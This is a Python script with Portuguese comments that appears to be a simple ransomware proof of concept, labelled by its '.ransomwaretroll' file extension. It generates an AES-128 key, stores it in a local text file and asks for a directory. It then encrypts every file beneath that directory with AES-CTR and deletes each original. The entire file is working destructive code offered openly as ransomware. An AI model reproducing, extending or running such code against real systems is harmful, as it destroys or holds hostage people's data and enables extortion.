import os
import secrets
import pyaes

def gerar_chave():
    """Gera e salva uma chave de criptografia."""
    try:
        key = secrets.token_bytes(16)  # Gera chave de 16 bytes (128 bits)
        with open("key_storage.txt", "w") as key_file:
            key_file.write(key.hex())
        print(f"Chave gerada e salva: {key.hex()}")
        return key
    except Exception as e:
        print(f"Erro ao gerar ou salvar a chave: {e}")
        exit(1)

def criptografa_arquivo(file_path, key):
    """Criptografa um arquivo usando AES-CTR."""
    try:
        if not os.path.isfile(file_path):
            raise FileNotFoundError(f"O arquivo '{file_path}' não foi encontrado.")
        
        with open(file_path, "rb") as f:
            file_data = f.read()
        print(f"Tamanho do arquivo original: {len(file_data)} bytes")
        
        # Criptografa o conteúdo
        aes = pyaes.AESModeOfOperationCTR(key)
        crypto_data = aes.encrypt(file_data)

        # Remove o arquivo original e salva o criptografado
        encrypted_file_path = f"{file_path}.ransomwaretroll"
        os.remove(file_path)
        with open(encrypted_file_path, "wb") as encrypted_file:
            encrypted_file.write(crypto_data)
        print(f"Arquivo '{file_path}' criptografado com sucesso para '{encrypted_file_path}'.")
        print(f"Tamanho do arquivo criptografado: {len(crypto_data)} bytes")
        
        # Validação: Lê o arquivo criptografado e exibe os primeiros bytes
        with open(encrypted_file_path, "rb") as test_file:
            print(f"Pré-visualização do arquivo criptografado: {test_file.read(16)}")

    except FileNotFoundError as e:
        print(f"Erro: {e}")
    except PermissionError:
        print(f"Permissão negada ao acessar '{file_path}'. Verifique as permissões.")
    except Exception as e:
        print(f"Erro inesperado ao criptografar '{file_path}': {e}")

def criptografa_dir(directory, key):
    """Criptografa todos os arquivos em um diretório recursivamente."""
    try:
        if not os.path.exists(directory):
            raise NotADirectoryError(f"O diretório '{directory}' não existe.")
        
        for root, _, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                print(f"Processando arquivo: {file_path}")
                criptografa_arquivo(file_path, key)
        print(f"Todos os arquivos em '{directory}' foram criptografados com sucesso.")
    except NotADirectoryError as e:
        print(f"Erro: {e}")
    except Exception as e:
        print(f"Erro inesperado ao processar o diretório '{directory}': {e}")

if __name__ == "__main__":
    try:
        directory_to_encrypt = input("Digite o diretório que deseja criptografar: ").strip()
        if not directory_to_encrypt:
            raise ValueError("Nenhum diretório informado.")
        
        key = gerar_chave()
        criptografa_dir(directory_to_encrypt, key)
    except ValueError as e:
        print(f"Entrada inválida: {e}")
    except KeyboardInterrupt:
        print("\nExecução interrompida pelo usuário.")
    except Exception as e:
        print(f"Erro inesperado: {e}")
